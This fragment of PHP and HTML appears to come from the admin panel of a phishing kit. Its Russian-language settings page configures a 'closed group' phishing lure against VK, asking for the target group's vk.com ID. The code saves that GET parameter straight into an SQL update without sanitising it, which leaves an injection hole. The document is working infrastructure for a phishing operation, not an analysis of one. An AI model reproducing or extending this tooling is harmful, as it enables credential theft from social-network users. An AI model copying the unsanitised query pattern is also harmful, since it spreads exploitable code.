...
if(isset($_GET['group_id'])) {
  ...
  $db->query("update settings set  `group_id` = '$group_id'");
	echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/group_settings.php">';
}
...
<h3 class="card-title">Настройки фишинга "закрытая группа" // business_dark</h3>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                ...
                <div class="form-group">
                    <label >Айди группы для работы фишинга. Указывать только то, что после vk.com/</label>
